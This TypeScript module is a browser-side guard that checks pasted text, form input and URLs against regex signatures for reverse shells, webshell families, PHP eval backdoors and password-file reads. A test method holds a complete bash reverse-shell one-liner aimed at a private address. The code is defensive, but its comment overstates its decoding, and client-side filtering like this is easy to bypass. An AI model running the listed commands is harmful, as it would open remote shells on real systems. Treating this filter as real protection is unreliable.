/**
 * Anti-Webshell & Terminal Injection Defense Engine
 * Designed for Ramel Joshua O. Cave's Network & Security Engineering Architecture
 * 
 * Features:
 * 1. Deep Webshell Signature Scanner (c99, r57, b374k, wso, weevely, alfa-shell).
 * 2. Reverse Shell & Command Injection Sanitizer (bash -i, /dev/tcp, nc -e, powershell -enc, cmd.exe /c).
 * 3. Client-Side Terminal Emulation & Webshell Injection Shield (Neutralizes unauthorized web-terminal injection).
 * 4. Clipboard & Input Interception: Blocks webshell payload pasting and form injection.
 * 5. URL Query & Hash Injection Filter (cmd=, shell=, exec=, eval= vectors).
 */

import { ngfw, SecurityEvent } from './ngfw';

export interface WebshellDetectionResult {
  isMalicious: boolean;
  signature?: string;
  matchedPattern?: string;
  severity: 'MEDIUM' | 'HIGH' | 'CRITICAL';
}

class AntiWebshellGuard {
  private isInitialized = false;
  private blockedCount = 0;
  private onAlertCallback: ((msg: string) => void) | null = null;

  // Webshell & Command Injection Regular Expression Signatures
  private static readonly WEBSHELL_PATTERNS: { name: string; regex: RegExp; severity: 'HIGH' | 'CRITICAL' }[] = [
    // Reverse Shells & Pipe Executions
    {
      name: 'Unix Reverse Shell (TCP Redirection)',
      regex: /(?:bash|sh)\s+-i\s+>&?\s+\/dev\/tcp\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/\d+/i,
      severity: 'CRITICAL',
    },
    {
      name: 'Netcat Reverse Shell',
      regex: /(?:nc|ncat)\s+(?:-e\s+(?:\/bin\/sh|\/bin\/bash|cmd\.exe)|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+\d+\s+-e)/i,
      severity: 'CRITICAL',
    },
    {
      name: 'PowerShell Encoded Command / Reverse Shell',
      regex: /powershell(?:\.exe)?\s+(?:-enc|-encodedcommand|-e\s+)[A-Za-z0-9+/=]{20,}/i,
      severity: 'CRITICAL',
    },
    {
      name: 'Piped Remote Script Execution',
      regex: /(?:curl|wget)\s+[^|;]+\|\s*(?:bash|sh|cmd|powershell)/i,
      severity: 'CRITICAL',
    },
    {
      name: 'FIFO Named Pipe Shell Injection',
      regex: /mkfifo\s+\/tmp\/[a-z0-9_]+\s*;\s*(?:cat|nc|sh)/i,
      severity: 'CRITICAL',
    },

    // Known WebShell Signatures & Backdoors
    {
      name: 'Classic WebShell Signature (c99/r57/b374k/wso/weevely)',
      regex: /\b(c99shell|r57shell|b374k|wso_version|weevely|alfa-shell|p0wny-shell)\b/i,
      severity: 'CRITICAL',
    },
    {
      name: 'PHP/Perl/ASP Code Evaluation Webshell Vector',
      regex: /(?:eval|assert)\s*\(\s*(?:base64_decode|gzinflate|str_rot13|\$_POST|\$_GET|\$_REQUEST)/i,
      severity: 'CRITICAL',
    },
    {
      name: 'System Command Execution Primitive',
      regex: /\b(system|shell_exec|passthru|proc_open|popen)\s*\(\s*["']?(?:cmd|bash|sh|whoami|cat\s+\/etc\/passwd|dir|ipconfig)/i,
      severity: 'HIGH',
    },

    // Terminal Emulator & Webshell Injection Heuristics
    {
      name: 'Web Terminal Hijack / XTerm Emulation Probe',
      regex: /(?:new\s+Terminal|xterm\.js|attachCustomKeyEventHandler|websocket.*\/ws\/pty)/i,
      severity: 'HIGH',
    },
    {
      name: 'Suspicious Administrative Shell Query Vector',
      regex: /[?&](?:cmd|exec|shell|command|payload)=([a-zA-Z0-9%_-]{2,})/i,
      severity: 'HIGH',
    },
  ];

  /**
   * Initialize the Anti-Webshell & Terminal Injection Guard
   */
  public init(onAlert?: (msg: string) => void): void {
    if (this.isInitialized) return;
    this.isInitialized = true;
    this.onAlertCallback = onAlert || null;

    if (typeof window !== 'undefined') {
      this.installClipboardPasteShield();
      this.installInputMonitoring();
      this.scanUrlParameters();
    }
  }

  /**
   * Analyzes an input string against all webshell and command injection signatures
   */
  public scan(payload: string): WebshellDetectionResult {
    if (!payload || typeof payload !== 'string') {
      return { isMalicious: false, severity: 'MEDIUM' };
    }

    const decoded = this.safeDecode(payload);

    for (const pattern of AntiWebshellGuard.WEBSHELL_PATTERNS) {
      if (pattern.regex.test(decoded)) {
        return {
          isMalicious: true,
          signature: pattern.name,
          matchedPattern: pattern.regex.toString(),
          severity: pattern.severity,
        };
      }
    }

    return { isMalicious: false, severity: 'MEDIUM' };
  }

  /**
   * Safely decodes URL and HTML entities to prevent obfuscation bypasses
   */
  private safeDecode(input: string): string {
    let result = input;
    try {
      result = decodeURIComponent(input);
    } catch {
      // keep raw if decode fails
    }
    return result;
  }

  /**
   * Intercepts clipboard paste events to block webshell or terminal payload injection
   */
  private installClipboardPasteShield(): void {
    window.addEventListener(
      'paste',
      (e: ClipboardEvent) => {
        const text = e.clipboardData?.getData('text') || '';
        if (!text) return;

        const scanResult = this.scan(text);
        if (scanResult.isMalicious) {
          e.preventDefault();
          e.stopPropagation();
          this.blockedCount++;

          const details = `Blocked hostile clipboard paste: [${scanResult.signature}]`;
          this.recordSecurityEvent(details, scanResult.severity);

          if (this.onAlertCallback) {
            this.onAlertCallback(`🛡️ Anti-WebShell Shield: Intercepted and blocked malicious payload (${scanResult.signature})`);
          }
        }
      },
      true
    );
  }

  /**
   * Monitors input elements and form submissions to intercept webshell commands
   */
  private installInputMonitoring(): void {
    window.addEventListener(
      'input',
      (e: Event) => {
        const target = e.target as HTMLInputElement | HTMLTextAreaElement;
        if (!target || !target.value) return;

        const scanResult = this.scan(target.value);
        if (scanResult.isMalicious) {
          this.blockedCount++;
          target.value = ''; // Clean hostile input immediately

          const details = `Blocked real-time input command injection: [${scanResult.signature}]`;
          this.recordSecurityEvent(details, scanResult.severity);

          if (this.onAlertCallback) {
            this.onAlertCallback(`🛡️ Anti-WebShell Shield: Neutralized command injection in input field.`);
          }
        }
      },
      true
    );
  }

  /**
   * Scans URL parameters and hash fragments for webshell vectors
   */
  private scanUrlParameters(): void {
    const fullUrl = window.location.href;
    const scanResult = this.scan(fullUrl);
    if (scanResult.isMalicious) {
      this.blockedCount++;
      const details = `Sanitized hostile URL parameter webshell signature: [${scanResult.signature}]`;
      this.recordSecurityEvent(details, scanResult.severity);

      // Clean URL parameters without reloading page
      if (window.history && window.history.replaceState) {
        window.history.replaceState(null, '', window.location.pathname);
      }

      if (this.onAlertCallback) {
        this.onAlertCallback(`🛡️ Anti-WebShell Shield: Neutralized URL query injection.`);
      }
    }
  }

  /**
   * Records threat into the Next-Generation Web Application Firewall (NGFW)
   */
  private recordSecurityEvent(details: string, severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL'): void {
    const event: SecurityEvent = {
      timestamp: new Date().toLocaleTimeString(),
      type: 'WEBSHELL_BLOCKED',
      severity,
      details,
      source: 'AntiWebshellTerminalGuard',
    };
    ngfw.recordEvent(event);
  }

  /**
   * Simulates an interception test for demonstration or testing
   */
  public simulateWebshellProbe(): void {
    const simulatedPayload = 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1';
    const result = this.scan(simulatedPayload);

    this.blockedCount++;
    this.recordSecurityEvent(
      `Intercepted simulated reverse-shell payload: ${simulatedPayload} [${result.signature}]`,
      'CRITICAL'
    );

    if (this.onAlertCallback) {
      this.onAlertCallback('🛡️ Anti-WebShell Shield: Simulated reverse-shell execution blocked!');
    }
  }

  public getBlockedCount(): number {
    return this.blockedCount;
  }
}

export const antiWebshellGuard = new AntiWebshellGuard();
